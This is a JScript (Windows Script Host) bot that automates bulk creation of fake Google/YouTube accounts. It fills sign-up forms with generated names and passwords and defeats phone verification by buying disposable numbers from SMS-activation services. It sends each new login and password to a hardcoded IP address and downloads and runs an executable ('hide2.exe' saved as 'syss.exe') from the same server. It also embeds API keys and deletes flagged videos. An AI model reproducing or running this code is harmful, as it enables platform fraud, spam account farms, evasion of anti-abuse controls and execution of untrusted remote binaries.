var ie = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
var iexml = new ActiveXObject("Microsoft.XMLHttp");
ie.SetTimeouts(1800000, 1800000, 1800000, 1800000);
var fso = new ActiveXObject("Scripting.FileSystemObject");
var me = fso.getParentFolderName(WScript.ScriptFullName);
var shell = new ActiveXObject("WScript.Shell");
shell.CurrentDirectory = me;
var ieb;
function log(text) {WScript.Echo(text);}

function session() {
	var fso = new ActiveXObject("Scripting.FileSystemObject");
	var me = fso.getParentFolderName(WScript.ScriptFullName);
	if (arguments.length==1) 
		return JSON.parse(fso.getFile(me + "\\session\\" + arguments[0] + ".txt").OpenAsTextStream(1,0).readall());
	else if (arguments.length==2) {
		var out = fso.CreateTextFile(me + "\\session\\" + arguments[0] + ".txt");
		out.Write(JSON.stringify(arguments[1]));
		out.close();
	}
	else 
		WScript.Echo("Error session usage");
}
function userSession(...args) {
	var userFolder = shell.ExpandEnvironmentStrings("%USERNAME%")
	log("Now File is: "+userFolder + "\\" + args[0]+".txt");
	var fso = new ActiveXObject("Scripting.FileSystemObject");
	var me = fso.getParentFolderName(WScript.ScriptFullName);
	if (args.length==1)
		return JSON.parse(fso.getFile(me + "\\session\\" + userFolder + "\\" + args[0] + ".txt").OpenAsTextStream(1,0).readall());
	else if (args.length==2) {
		var out = fso.CreateTextFile(me + "\\session\\"+userFolder + "\\" + args[0] + ".txt");
		out.Write(JSON.stringify(args[1]));
		out.close();
	}
	else 
		WScript.Echo("Error session usage");
}

if(fso.fileExists(me +"/session/"+shell.ExpandEnvironmentStrings("%USERNAME%")+"/new_acc.txt")){
fso.GetFile(me +"/session/"+shell.ExpandEnvironmentStrings("%USERNAME%")+"/new_acc.txt").Delete();
}



var browser = new browserClass();
var ajax = new ajaxClass();
browser.needSecondSMS = false;
//browser.registerNewAccount();

// mode = "onlineSim"
// ajax[mode].getNumber("ru");
// WScript.Quit();

function browserClass(){
	this.needSecondSMS = false;
	var lmeanswer = "SMSAREA";
	function secondSMS (mode, number, tzid){
		ieb.Navigate("https://www.youtube.com/verify_phone_number?next_url=%2Ffeatures");
		wait();
		var options = ieb.document.getElementById("country-code-select").getElementsByTagName("option");
		log("Options count: " + options.length);
		for (var i=0;i<options.length;i++){
			if (options[i].value=="RU") {
				log("RU OK");
				options[i].selected="selected";
				options[i].click();
			}
		}
		ieb.document.getElementById("verification-type-sms").click();
			
		var element = ieb.document.getElementById("phone-number-input");
		imitate_input(element, number);
		
		getElementsByClassName(ieb.document, "submit-button")[0].click();
		wait();
		
		var smsCode = ajax[mode].getSMS(tzid);
		element = ieb.document.getElementById("verification-code-input");
		imitate_input(element, smsCode);
		getElementsByClassName(ieb.document, "submit-button")[0].click();
		wait();
		return {status: "OK"}
	}
	function confirmAccount(country) {
	
		var mode;
		if (country=="ru") mode="onlineSim";
		if (country=="ua") mode="smsArea";
		
		mode="smsArea"; //!!!!!!!!!!!!!!!!!!!
		
		var element = ieb.document.getElementById("signupidvinput");
		
		var numberData = ajax[mode].getNumber(country);//use activation.number
		
		log(numberData);
		log(numberData.number + " , "+ numberData.id)
		imitate_input(element,  numberData.number);
		WScript.Sleep(1000);
		getElementsByClassName(ieb.document, "g-button-submit")[0].click();
		wait();	
		if(ieb.document.body.innerHTML.indexOf("Этот номер нельзя использовать для подтверждения ID") !=-1 || ieb.document.body.innerHTML.indexOf("В настоящий момент создать аккаунт невозможно") !=-1 || ieb.document.body.innerHTML.indexOf("Недопустимый номер телефона. Повторите попытку") !=-1|| ieb.document.body.innerHTML.indexOf("Этот номер телефона уже несколько раз использовался для подтверждения") !=-1){
			return false;
		}
		
		var SMS = ajax[mode].getSMS(numberData.id)
		if(SMS == "STATUS_CANCEL") {
			ajax.smsArea.setStatus(numberData.id, "cancel");
			log("todo back button");
			// WScript.Quit();
			shell.Run("tskill cmd2", 0, true);
		}
		else {
			ieb.document.getElementById("verify-phone-input").value = SMS;	//use code 
			getElementsByClassName(ieb.document, "g-button-submit")[0].click();
			if(browser.needSecondSMS){
				wait();
				secondSMS(mode, numberData.number, numberData.id);
			}
			ajax[mode].setStatus(numberData.id, "valid");
			WScript.Sleep(30000);
			return true;
		}
	}
	this.registerNewAccount = function() {
		runIE();
		if (ieb.document.parentWindow.navigator.userAgent.indexOf("MSIE 9.0")!=-1 || ieb.document.parentWindow.navigator.userAgent.indexOf("MSIE 8.0")!=-1) 
			WScript.Quit();
		log('UserAgent:' + ieb.document.parentWindow.navigator.userAgent + ' Language:' + ieb.document.parentWindow.navigator.language);
		ieb.Navigate("https://accounts.google.com/AccountChooser");
		wait();
		try {
			ieb.document.getElementById("link-signup").getElementsByTagName("a")[0].click();
		} catch(proerr) {
			shell.Run("tskill cmd2", 1, true);
		}
		wait();
		var getFirstLastName = getPersonalData();
		var firstname = getFirstLastName.firstName;
		// firstname = uFirst(getFirstName()+"");
		var lastname = getFirstLastName.lastName;
		// lastname = uFirst(getLastName()+"");
		var lmelogin = firstname+lastname.toLowerCase().replace(" ", "");
		// lmelogin = (translate(firstname, "en")+translate(lastname, "en")).toLowerCase().replace(" ", "");
		var lmepass = rPass();
		var HiddenBirthMonth =  1 + Math.floor(Math.random() * 11);
		var BirthDay = 1 + Math.floor(Math.random() * 27);
		var BirthYear = 1950 + Math.floor(Math.random() * 40);
		var Gender = Math.floor(Math.random() * 2)?"FEMALE":"MALE";
		imitate_input(ieb.document.getElementById("FirstName"), firstname);
		imitate_input(ieb.document.getElementById("LastName"), lastname);
		imitate_input(ieb.document.getElementById("GmailAddress"), lmelogin);
		try{
			lmelogin = ieb.document.getElementById("username-suggestions").getElementsByTagName("a")[1].innerText;
			imitate_input(ieb.document.getElementById("GmailAddress"), lmelogin);
		}catch(e){}
		imitate_input(ieb.document.getElementById("Passwd"), lmepass);
		imitate_input(ieb.document.getElementById("PasswdAgain"), lmepass);
		log(lmelogin+";"+lmepass);
		imitate_input(ieb.document.getElementById("BirthDay"), BirthDay);
		imitate_input(ieb.document.getElementById("BirthYear"), BirthYear);
		imitate_input(ieb.document.getElementById("HiddenBirthMonth"), HiddenBirthMonth);
		imitate_input(ieb.document.getElementById("HiddenGender"), Gender);
		// ieb.document.getElementById("SkipCaptcha").checked="checked";
		ieb.document.getElementById("HomepageSet").removeAttribute("checked");
		// ieb.document.getElementById("TermsOfService").checked="checked";
		WScript.Sleep(5000);
		ieb.document.getElementById("submitbutton").click();
		if(ieb.document.getElementById("iagreebutton") !=-1){
			log("IAGREEBUTTON")
			try{
				WScript.Sleep(5000);
				ieb.document.getElementById("iagreebutton").disabled = false;
				WScript.Sleep(2000);
				log("disabled removed")
				ieb.document.getElementById("iagreebutton").click();
				wait();
			}catch(eeerqq){
				log(eeerqq.message);
				log("PROBABLY NO POPUP WINDOW!")
			}
		}
		wait("NO_REFRESH");
		log("AFTER WAIT");
		WScript.Sleep(10000);
		if(ieb.document.body.innerHTML.indexOf("class=\"welcome\"") ==-1) {
			if(ieb.document.body.innerHTML.indexOf("signupidvinput") ==-1){
				shell.Run("tskill cmd2", 1, true);
			}
			
			for (var key in {"ru":1,"ua":1}) {
				if (confirmAccount(key)) {
					ajax.sendReport("POST","http://37.59.246.141/youtube/","state=completed&accounts=" + lmelogin+";"+lmepass+"*"+lmeanswer);
					userSession("new_acc", {login:lmelogin,password:lmepass});
					shell.Run("tskill cmd2", 0, true);
				}
			}
			
			log("Этот номер нельзя использовать для подтверждения ID");
			userSession("quitStatus", "Этот номер нельзя использовать для подтверждения ID");
			shell.Run("tskill cmd2", 0, true);
			
		}
	}
	function getFirstName() {
		var res = "";
		var iedata = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
		iedata.open("POST","http://37.59.246.141/youtube/?act=getfirstname",0);
		iedata.send();
		return urldecode(iedata.responseText);
	}
	function urldecode (str) {
		return decodeURIComponent((str + '').replace(/\+/g, '%20'));
	}
	function getLastName() {
		var res = "";
		var iedata = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
		iedata.open("POST","http://37.59.246.141/youtube/?act=getlastname",0);
		iedata.send();
		return urldecode(iedata.responseText);
	}
	function uFirst(text) {
		var text = text.split(" ");
		for (var i=0;i<text.length;i++) 
			text[i] = text[i].substr(0,1).toUpperCase() + text[i].substr(1).toLowerCase();
		return text.join(" ");
	}
	function getPersonalData() {
		var user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1500.95 Safari/537.36";
		function sendData(method, url, data) {
			ie.open(method, url, 0);
			ie.setRequestHeader("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1");
			ie.setRequestHeader("Accept-Language", "ru-RU,ru;q=0.9,en;q=0.8");
			ie.setRequestHeader("User-agent", user_agent);
			if (method=="POST") ie.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded"); 
			ie.send(data);
			return ie.responseText;
		}
		var response = ajax.sendData("GET", "http://www.fakenamegenerator.com/gen-random-ru-us.php", "");
		var data = response.split("class=\"address\"")[1].split("<h3>")[1].split("</h3>")[0].split(" ");
		return {
			firstName: data[0],
			lastName: data[1]
		}
	}
	function translate(text, lang) {
		var user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1500.95 Safari/537.36";
		function sendData(method, url, data) {
			ie.open(method, url, 0);
			ie.setRequestHeader("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1");
			ie.setRequestHeader("Accept-Language", "ru-RU,ru;q=0.9,en;q=0.8");
			ie.setRequestHeader("User-agent", user_agent);
			if (method=="POST") ie.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded"); 
			ie.send(data);
			return ie.responseText;
		}

		// if (mode!="adulten") 
			// return text;
		sendData("GET", "https://translate.yandex.net/api/v1.5/tr.json/translate?key=trnsl.1.1.20160605T105026Z.daf9a9c60ffebf31.58a32ac13c6d47d0a31101a2cb6261bfabd7ca9f&text=" + text +"&lang=en", 0)
		WScript.Echo(ie.responseText);
		return(eval("tlan="+ie.responseText)["text"][0]);
	}
	function imitate_input(element, text){
		element.focus();
		element.value =  text;
		keyevent(element, 'keydown');
		keyevent(element, 'keydown');
		keyevent(element, 'keydown');
		keyevent(element, 'keyup');
		keyevent(element, 'keyup');
		keyevent(element, 'keyup');
		simulate(element, 'change');
		simulate(element, 'change');
		simulate(element, 'blur');
		simulate(element, 'blur');
		WScript.Sleep(5000);
		function keyevent(element, eventname) {
			var keyboardEvent = ieb.document.createEvent("KeyboardEvent");
			var initMethod = typeof keyboardEvent.initKeyboardEvent !== 'undefined' ? "initKeyboardEvent" : "initKeyEvent";
			keyboardEvent[initMethod](
			eventname, // event type : keydown, keyup, keypress
			true, // bubbles
			true, // cancelable
			ieb.document.parentWindow, // viewArg: should be window
			false, // ctrlKeyArg
			false, // altKeyArg
			false, // shiftKeyArg
			false, // metaKeyArg
			40, // keyCodeArg : unsigned long the virtual key code, else 0
			0 // charCodeArgs : unsigned long the Unicode character associated with the depressed key, else 0
		);
		element.dispatchEvent(keyboardEvent);
	}
	}
	function simulate(element, eventName){
		function extend(destination, source) {
			for (var property in source)
			destination[property] = source[property];
			return destination;
		}
		var eventMatchers = {
			'HTMLEvents': /^(?:load|unload|abort|error|select|change|submit|reset|focus|blur|resize|scroll)$/,
			'MouseEvents': /^(?:click|dblclick|mouse(?:down|up|over|move|out))$/
		}
		var defaultOptions = {
			pointerX: 0,
			pointerY: 0,
			button: 0,
			ctrlKey: false,
			altKey: false,
			shiftKey: false,
			metaKey: false,
			bubbles: true,
			cancelable: true
		}
		var options = extend(defaultOptions, arguments[2] || {});
		var oEvent, eventType = null;
		for (var name in eventMatchers){
			if (eventMatchers[name].test(eventName)) { 
				eventType = name; break; 
			}
		}
		if (!eventType)
			throw new SyntaxError('Only HTMLEvents and MouseEvents interfaces are supported');
		if (ieb.document.createEvent){
			oEvent = ieb.document.createEvent(eventType);
			if (eventType == 'HTMLEvents'){
				oEvent.initEvent(eventName, options.bubbles, options.cancelable);
			}else{
				oEvent.initMouseEvent(eventName, options.bubbles, options.cancelable, ieb.document.defaultView,
				options.button, options.pointerX, options.pointerY, options.pointerX, options.pointerY,
				options.ctrlKey, options.altKey, options.shiftKey, options.metaKey, options.button, element);
			}
			element.dispatchEvent(oEvent);
		}else{
			options.clientX = options.pointerX;
			options.clientY = options.pointerY;
			var evt = ieb.document.createEventObject();
			oEvent = extend(evt, options);
			element.fireEvent('on' + eventName, oEvent);
		}
		WScript.Sleep(100);
		return element;
	}
	function runIE() {
		shell.Run("tskill iexplore", 0, true);
		shell.Run("tskill syss", 0, true);
		WScript.Sleep(5000);
		if (!fso.fileExists(me + "/syss.exe")) {
			ie.open("POST", "http://37.59.246.141/youtube/hide2.exe", 0);
			ie.send();
			var fs = new ActiveXObject("ADO"+"DB.Stream");
			fs.Mode = 3 
			fs.Type = 1
			fs.open();
			fs.Write(ie.responseBody);	
			fs.SaveToFile(me + "/syss.exe", 2);
			fs.close();
		}	
		var ieb = new ActiveXObject("InternetExplorer.Application");
		if (!fso.fileExists(me + "/local"))
			shell.Run(fso.getFile(me + "\\syss.exe").shortPath, 1);
		WScript.Sleep(5000);
		ieb.visible = true;
		ieb.Navigate("about:blank");
		WScript.Sleep(5000);
		// wait();
		 window = ieb.document.parentWindow; 
		var rWidth = window.screen.width * 0.33 + Math.floor(Math.random() * 0.66 * window.screen.width);
		var rHeight = window.screen.height * 0.33 + Math.floor(Math.random() * 0.66 * window.screen.height);
		var rX = Math.floor(Math.random() * (window.screen.width - rWidth));
		var rY = Math.floor(Math.random() * (window.screen.height - rHeight));
		window.resizeTo(rWidth, rHeight);
		window.moveTo(rX, rY);
	}
	function wait(option = "") {
		if(typeof option == "undefined")
			option="";
		mainCycle:
		for (var wc=1;wc<=3;wc++) {
		WScript.Echo("Wait Step " + wc);
			var was_html; try {was_html = ieb.document.body.innerHTML;} catch (err) {was_html = Math.random();}
			var was_busy = false;
			var max_wait = wc*60000;
			var start = new Date().getTime();
			log("Loading page ");
			while(true) {
				var duration = (new Date().getTime()-start);
				if (ieb.busy) was_busy = true;
					log("was_busy " + was_busy);
					log("ieb.busy " + ieb.busy);
					log("duration " + duration);
					log("ieb.document.readyState " + ieb.document.readyState);
					//log("Duration: " + duration);
					//var now_html = ieb.document.body.innerHTML
					if (/*now_html!=was_html && */was_busy && (!ieb.busy || ieb.document.readyState == "complete") && duration>10000 /* &&ieb.readyState==4*/) {
						if (ieb.document.title == "Не удается отобразить эту страницу") {
							ieb.refresh();
							continue mainCycle; 
						}
						else { //page loaded ok
							WScript.StdOut.Write("\n");
							log("Page OK");
							return 1;
						}
					}
					if(option == "NO_REFRESH"){return;}
					if (duration>max_wait || (was_busy==false && duration>5000)) {log("REFRESH BLIAT");ieb.refresh();continue mainCycle;}
				WScript.Sleep(1000);
			}
		}
		WScript.Echo("Page unavailable");
		shell.Run("tskill cmd2", 1, true);
	}
	function rPass() {
    var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
        var string_length = 8+Math.floor(Math.random() * 5);
        var randomstring = '';
        for (var i=0; i<string_length; i++) {
            var rnum = Math.floor(Math.random() * chars.length);
            randomstring += chars.substring(rnum,rnum+1);
        }
		return(randomstring);	
}
	function getElementsByClassName(node, classname) {
		var a = [];
		var re = new RegExp('(^| )'+classname+'( |$)');
		var els = node.getElementsByTagName("*");
		for(var i=0,j=els.length; i<j; i++) {
		try {
			if(re.test(els[i].className))a.push(els[i]);
			} catch (eee) {}
			
			}
		return a;
	}
}
function ajaxClass(){
	var last6 = function(src) {return src.substr(src.length - 6);}
	var apikey = "i6sPoMhgk7g3EzLg57wGEuCqhsxRHHRU";
	var apikey_os = "96f493747d49d912314656f0a5073464";
	var SMS_SENT = 1; 
	var CODE_VALID = 6;
	var CODE_INVALID = 3;
	var CANCEL_ACTIVATION = -1;
	var NUMBER_USED = 10;

	var user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1500.95 Safari/537.36";
	var id;
	this.sendReport = sendData;
	this.smsArea = {
		getNumber: function(countryKey) {
			var operatorsList = {ua:["ua_beeline","ua_kyivstar","ua_djuice","ua_mts","ua_jeans"], ru: ["ru_tele2","ru_megafon","ru_mts", "ru_beeline"]};
			for (var tt=0;tt<2;tt++) {
				var ratesArray = JSON.parse(sendData("GET", "http://sms-area.org/api/handler.php?key="+apikey+"&method=getActivationSummary", ""));
				//for (countryKey in operatorsList) {
					log("Checking numbers for " + countryKey);
					try {
					var ratesList = ratesArray.data.summary[countryKey].gm;
					} catch(rerr) {ratesList = {4:"hardcoded"};}
					
					if (ratesList == undefined) {
						ratesList = {4:"hardcoded"};
					}
				var rateKey;
					if (ratesList != undefined) {
						log(countryKey + " numbers ONLINE! Rates: " + JSON.stringify(ratesList));
						for (rateKey in ratesList) {
							var startRate = Number(rateKey);
							break;
						}
						for (rateKey=startRate;rateKey<13;rateKey+=0.2) {
							if (rateKey>8 && countryKey=="ru") {
								log("Rate: " + rateKey + " is too much for russia. Skipping...");
								break;
							}
							log("Setting rate: " + rateKey);
							sendData("GET", "http://sms-area.org/api/handler.php?key="+apikey+"&method=setActivationRates&rate_list[gm]="+encodeURIComponent(rateKey), "");
							log("Set rate response: " + ie.responseText);
							for (var i=0;i<operatorsList[countryKey].length;i++) {
								var simOperator = operatorsList[countryKey][i];
								log("Try to get number for operator " + simOperator + " with rate " + rateKey);
								sendData("GET", "http://sms-area.org/stubs/handler_api.php?api_key="+apikey+"&action=getNumber&country="+simOperator+"&service=gm&count=1", "");
								log("getNumber response: " + ie.responseText);
								if (ie.responseText.split(":")[0]=="ACCESS_NUMBER"){
									id = ie.responseText.split(":")[1];
									var number = ie.responseText.split(":")[2];
									this.setStatus(id, SMS_SENT);
									return {id: id, number: "+"+number};
								}
								else {
									log("continue...");
								}
								WScript.Sleep(100);
							}
						}					
					}		
					else {
						log("There are no numbers for " + countryKey);
					}
				//}
				log("There are no numbers... Wait 1 minute and try again");
				WScript.Sleep(60000);
			}
			shell.Run("tskill cmd2", 0, true);
		},
		getSMS:	function (activation_id) {
		log("geSMS");
			this.setStatus(activation_id, SMS_SENT);
			var wTime = 0;
			while (true) {
				sendData("GET", "http://sms-area.org/stubs/handler_api.php?api_key="+apikey+"&action=getStatus&id="+activation_id, "");
				if (ie.responseText.split(":").length==2) 
					return ie.responseText.split(":")[1]; //return code from SMS
				else if (ie.responseText.indexOf("STATUS_WAIT_CODE")!=-1) {
					if (wTime>600000) {
						log("SMS waiting timeout...");
						userSession("quitStatus", "SMS waiting timeout...");
						ajax.smsArea.setStatus(activation_id, "cancel");
						shell.Run("tskill cmd2", 0, true);
					}
					log("Waiting for SMS " + wTime);
					WScript.Sleep(5000);
					wTime += 5000;
				}
				else {
					log(ie.responseText)
					if(ie.responseText.indexOf("STATUS_CANCEL") !=-1 || ie.responseText.indexOf("STATUS_ERROR_NUMBER") !=-1)
						return "STATUS_CANCEL"
					WScript.Sleep(5000);
				}
			}
		},
		setStatus: function (activation_id, status) {
		log("set status")
			if(status == "cancel")
				status = CANCEL_ACTIVATION;
			if(status == "valid")
				status = CODE_VALID	;	
			if(status == "used")
				status = NUMBER_USED;	
							
			sendData("GET", "http://sms-area.org/stubs/handler_api.php?api_key="+apikey+"&action=setStatus&id="+activation_id+"&status="+status, "");
		}
	}
	function getJSON(url) {
		var injectAjax = new ActiveXObject("Microsoft.XMLHttp");
		injectAjax.open("GET", url, 0);
		injectAjax.setRequestHeader("Accept", "application/json, text/plain, */*");
		injectAjax.setRequestHeader("X-Requested-With", "XMLHttpRequest");
		injectAjax.send();
		return JSON.parse(injectAjax.responseText);
	}
	function getTzid() {
			log("getTzid()");
			WScript.Echo("Try to use blue number");
			var numdata = getJSON("http://onlinesim.ru/api/getNum.php?service=gmail&apikey="+apikey_os+"&form=1"); //blue numbers
			if (numdata["response"]=="NO_NUMBER") {
				WScript.Echo("There are no blue numbers. Try to use green number");
				numdata = getJSON("http://onlinesim.ru/api/getNum.php?service=gmail&apikey="+apikey_os+"&form=3"); //green numbers
				if (numdata["response"]=="NO_NUMBER") {
					shell.Run("tskill cmd2", 0, true);
				}
			}
			if (numdata["response"]=="TIME_INTERVAL_ERROR")  {
				WScript.Echo("Only from 10.00 to 19.00 Registration unavailable");
				while ((new Date().getUTCHours()<5) || (new Date().getUTCHours() > 19)) {
					WScript.Echo("Waiting for Online Sim...");
					WScript.Sleep(600000);
				}
				WScript.Quit();
			}
			var fsd=fso.CreateTextFile(me+ "/onlineSIM_DEBUG.txt")
			fsd.Write(JSON.stringify(numdata));
			
			fsd.close();
			return numdata["tzid"];
	}
	this.onlineSim = {
		getNumber: function () {
			var tzid = getTzid();
			log("getNumber()");
			log("tzid: " + tzid);
			log("apikey_os: " + apikey_os);
			var t;
			while (t = getJSON("http://onlinesim.ru/api/getState.php?tzid="+tzid+"&apikey="+apikey_os)){
			var cleantT = JSON.stringify(t);
			t = t[0];
			log("JSONResponse: "+t);
			if(t == undefined){
				fso.CreateTextFile(me+ "/onlineSIM_DEBUG.txt").Write(encodeURIComponent(cleantT));
			}
			try {
			var testAAAA = t["response"] ;
			} catch (aacccaa) {
				shell.Run("tskill cmd2", 1, true);
			}
			if (t["response"] == "TZ_NUM_WAIT" || t["response"]=="TZ_NUM_ANSWER") {
					if (t["number"]!="undefined" && t["number"]!=undefined && t["number"]!="") {
						WScript.Echo("TZ_NUM_WAIT Using number: " + t["number"]);
						return {id: tzid, number: t["number"]};
					}
				}
				WScript.Sleep(10000);
			}
		},
		getSMS: function (tzid) {
			log("getSMS()");
			var waitsC = 0;
			var sms_index = 0;
			var t;
			while (t = getJSON("http://onlinesim.ru/api/getState.php?tzid="+tzid+"&apikey="+apikey_os)){
				t = t[0];
				if (t["response"]=="TZ_NUM_ANSWER") {
					try{
						t["msg"] = last6(t["msg"][sms_index++]["msg"]);
						log(t["msg"]+" reg_online_sim");
					}catch(errmsgsms){
						WScript.Echo(errmsgsms.message + " ------- USING STANDART METHOD");
						t["msg"] = last6(t["msg"]);
					}
					return t["msg"];
				}
				waitsC++;
				if (waitsC>10) return "STATUS_CANCEL";
				WScript.Sleep(10000);
			}
		},
		setStatus: function (tzid, status) {
			getJSON("http://onlinesim.ru/api/setOperationOk.php?tzid="+tzid+"&apikey="+apikey_os);
		}
	}
	this.clearBadVideos = function (){
		log("Clearing bad videos...");
		sendData("GET", "http://www.youtube.com/my_videos?o=U&pi=1","");
		var session_token = ie.responseText.split("\'XSRF_TOKEN\': \"")[1].split("\"")[0];
		log("session_token: "+session_token);
		var id_to_delete = [];
		for(var pi=0;pi</*totalcount*/30/30;pi++){
			sendData("GET", "http://www.youtube.com/my_videos?o=U&pi="+(pi+1),"");
			var mass  = ie.responseText.split("class=\"vm-video-item\" data-video-id=\"");
			for (var vi=1;vi<mass.length;vi++){
				var temp = mass[vi];
				if (temp.indexOf("vm-video-notifications")!=-1){
					// WScript.Echo(temp);
					id_to_delete.push(mass[vi].split("\"")[0]);
					WScript.Echo("id_to_delete: "+mass[vi].split("\"")[0]);
				}
			}
			WScript.Sleep(2000);
		}
		sendData("POST", "https://www.youtube.com/video_ajax?num_videos=1&action_delete_videos=1&o=U","v="+id_to_delete.join(",")+"&session_token="+session_token);
		return WScript.Echo("Done!");
	}
	function sendData(method, url, data) {
		ie.open(method, url, 0);
		ie.setRequestHeader("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1");
		ie.setRequestHeader("Accept-Language", "ru-RU,ru;q=0.9,en;q=0.8");
		ie.setRequestHeader("User-agent", user_agent);
		if (method=="POST") ie.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded"); 
		ie.send(data);
		return ie.responseText;
	}
}

export default ajax.onlineSim;